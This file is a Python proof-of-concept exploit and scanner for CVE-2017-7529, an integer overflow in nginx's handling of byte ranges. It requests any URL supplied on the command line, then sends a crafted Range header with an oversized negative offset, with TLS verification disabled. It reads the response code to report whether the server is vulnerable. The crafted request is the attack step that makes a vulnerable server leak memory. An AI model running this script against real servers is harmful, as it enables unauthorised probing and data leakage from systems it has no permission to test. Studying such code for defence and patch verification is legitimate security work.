#!/usr/bin/env python
# -*- coding:utf-8 -*-

# Nginx - Remote Integer Overflow Vulnerability
# CVE-2017-7529

import sys
import logging
import argparse


try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Please install the requests module.")
    sys.exit(1)


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def send_request(url, headers=None, timeout=8):
    kwargs = {"headers": headers, "timeout": timeout, "verify": False}
    response = requests.get(url, **kwargs)
    http_headers = response.headers

    log.info("status: %s" % response.status_code)
    log.info("server: %s" % http_headers.get("Server", ""))
    return response


def exploit(url):
    log.info("target: %s", url)
    response = send_request(url)

    content_length = response.headers.get("Content-Length", 0)
    bytes_length = int(content_length) + 623
    content_length = "bytes=-%d,-9223372036854%d" % (
        bytes_length,
        776000 - bytes_length,
    )

    response = send_request(url, headers={"Range": content_length})
    if response.status_code == 206 and "Content-Range" in response.headers:
        log.info("vulnerable?: Vulnerable to CVE-2017-7529")
    elif response.status_code == 416:
        log.warn("vulnerable?: Not Vulnerable (Range Not Satisfiable)")
    else:
        log.info("vulnerable?: Unknown (%s)" % response.status_code)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Nginx - Remote Integer Overflow Vulnerability - CVE 2017-7529"
    )
    parser.add_argument("url", help="URL to test", type=str)
    args = parser.parse_args()

    url = requests.utils.urlparse(args.url)

    if not url.scheme:
        print(
            "URL scheme specifier is missing. Please include either 'http://' or 'https://'."
        )
        sys.exit(1)

    if not url.path:
        print("URL path is missing. Please include a full path.")
        sys.exit(1)

    exploit(args.url)
